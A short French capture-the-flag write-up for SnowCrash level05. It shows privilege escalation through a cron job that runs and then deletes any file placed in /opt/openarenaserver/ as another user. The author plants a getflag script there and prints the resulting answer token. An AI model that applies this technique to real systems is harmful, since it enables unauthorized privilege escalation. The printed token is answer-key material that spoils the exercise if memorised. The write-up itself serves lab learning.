# Level05 - Tâche CRON
Pour résoudre le level05, on nous envoie un mail. Ce dernier contient ce qui ressemble à une tâche cron. Cette dernière semble exécuter avec l'utilisateur `flag05` toutes les 2 minutes le script `openarenaserver` dans `/usr/sbin`.

```
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Si on regarde ce script, on se rends compte qu'il va exécuter puis supprimer tous les fichiers dans le dossier `/opt/openarenaserver/`.
Il nous suffit donc de créer un script qui va exécuter getflag et de le placer dans ce dossier.

```
#!/bin/bash
getflag > /tmp/flag
```
On oublie pas de `chmod 777 /opt/openarenaserver/getflag`, et on attends que le script s'exécute.

On peut ensuite récupérer notre flag dans le fichier `/tmp/flag`.
```
level05@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

On a notre token: `viuaaale9huek52boumoomioc`

